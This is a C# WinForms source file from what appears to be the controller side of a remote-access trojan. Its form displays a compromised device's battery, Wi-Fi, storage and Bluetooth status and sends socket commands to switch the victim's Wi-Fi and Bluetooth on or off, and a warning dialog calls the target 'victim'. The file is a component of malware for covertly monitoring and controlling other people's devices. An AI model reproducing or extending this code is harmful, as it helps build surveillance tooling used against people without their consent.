using System;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Bilgiler : MetroFramework.Forms.MetroForm
    {
        Socket sck; public string ID = "";
        public Bilgiler(Socket socket, string aydi)
        {
            InitializeComponent();
            sck = socket; ID = aydi;
            button1.Click += button1_Click;
            button2.Click += button2_Click;
            button3.Click += button3_Click;
            button4.Click += button4_Click;
            button5.Click += button5_Click;
            metroTabControl1.SelectedIndex = 0;

        }
        public void bilgileriIsle(params string[] args)
        {
            textBox1.Text = string.Empty;
            progressBar1.Value = int.Parse(args[0].Replace("%", ""));
            label1.Text = "%" + args[0];
            label2.Text = args[1].Split('&')[0];
            label3.Text = args[1].Split('&')[1];
            label4.Text = args[2]; if(!args[2].ToLower().Contains("unknow") && !args[2].ToLower().Contains("batt")) {
                pictureBox2.Invoke((MethodInvoker)delegate { pictureBox2.Visible = true; });
            } else
            {
                pictureBox2.Invoke((MethodInvoker)delegate { pictureBox2.Visible = false; }); }

            label5.Text = args[3].Contains("[WIFI]") ? args[3].Split(new[] { "[WIFI]"}, StringSplitOptions.None)[0].Replace($"{'"'}","").Replace("<","")
                .Replace(">",""): args[3];
            if(label5.Text.Length > 15) { label5.Text = label5.Text.Substring(0, 15) + ".."; }
            label6.Text = args[4].ToUpper();
            label7.Text = args[5].ToUpper();
            label8.Text = args[6].ToUpper();

            if(args[8] == "unknown") { metroProgressBar1.Value = 0; }
            metroProgressBar1.Tag = args[8] != "unknown" ? "Total: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[8].Split('?')[0]))
                + "\nUsed: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[8].Split('?')[1])) + "\nFree: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[8].Split('?')[2])) + "\nPer: %" + (metroProgressBar1.Value = Convert.ToInt32(Convert.ToDouble(args[8].Split('?')[1]) * 100 / Convert.ToDouble(args[8].Split('?')[0]))).ToString() : args[8];

            label9.Text = args[8] == "unknown" ? "n/a" : "%" + metroProgressBar1.Value.ToString();
            args[9] = args[9].Replace("-","");
            if (args[9] == "unknown") { metroProgressBar2.Value = 0; }
            metroProgressBar2.Tag = args[9] != "unknown" ? "Total: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[9].Split('?')[1]))
                + "\nUsed: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[9].Split('?')[1]) - Convert.ToDouble(args[9].Split('?')[0]))
                 + "\nFree: " + Form1.GetFileSizeInBytes(Convert.ToDouble(args[9].Split('?')[0]))
                 + "\nPer: %" + (metroProgressBar2.Value = Convert.ToInt32((Convert.ToDouble(args[9].Split('?')[1]) - Convert.ToDouble(args[9].Split('?')[0])) * 100 / Convert.ToDouble(args[9].Split('?')[1]))).ToString() : args[9];// : args[9];

            label10.Text = args[9] == "unknown" ? "n/a" : "%" + metroProgressBar2.Value.ToString();
            
            if (!args[3].Contains("not conn") && !args[3].Contains("An error") && !args[3].Contains("null"))
            {
                using (System.IO.FileStream fs = new System.IO.FileStream(Environment.CurrentDirectory +
                    $@"\resources\Signal\w{args[3].Split(new[] { "[WIFI]" }, StringSplitOptions.None)[1]}.png", System.IO.FileMode.Open))
                {
                    pictureBox1.Image = System.Drawing.Image.FromStream(fs);
                    pictureBox1.Tag = args[3].Split(new[] { "[WIFI]" }, StringSplitOptions.None)[1] + " of 4";
                }
            }
            else { pictureBox1.Image = null; pictureBox1.Tag = "unknown"; }
            
            groupBox5.Text = "Wi-Fi" + args[10].Replace("enabled", "Turned on").Replace("false", "Turned off");

            string[] spl = args[7].Split('<');
            for (int i = 0; i < spl.Length; i++)
            {
                textBox1.Text += spl[i] + Environment.NewLine;
            }
        }
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("SARJ", Encoding.UTF8.GetBytes("ECHO"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
            }
            catch (Exception) { }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("WIFI", Encoding.UTF8.GetBytes("true"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Connection between you and victim could be lost. Are you sure?",
                "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                try
                {
                    byte[] senddata = Form1.MyDataPacker("WIFI", Encoding.UTF8.GetBytes("false"));
                    sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    button1.PerformClick();
                }
                catch (Exception) { }                
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("BLUETOOTH", Encoding.UTF8.GetBytes("true"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] senddata = Form1.MyDataPacker("BLUETOOTH", Encoding.UTF8.GetBytes("false"));
                sck.Send(senddata, 0, senddata.Length, SocketFlags.None);
                button1.PerformClick();
            }
            catch (Exception) { }
        }

        private void Bilgiler_Load(object sender, EventArgs e)
        {
            textBox1.BringToFront();
        }

        private void pictureBox1_MouseHover(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(pictureBox1, pictureBox1.Tag.ToString());
        }

        private void metroProgressBar1_MouseHover(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(metroProgressBar1, metroProgressBar1.Tag.ToString());
        }

        private void metroProgressBar2_MouseHover(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(metroProgressBar2, metroProgressBar2.Tag.ToString());
        }

        private void pictureBox2_MouseHover(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(pictureBox2, "Charging: %" + progressBar1.Value.ToString());
        }
    }
}
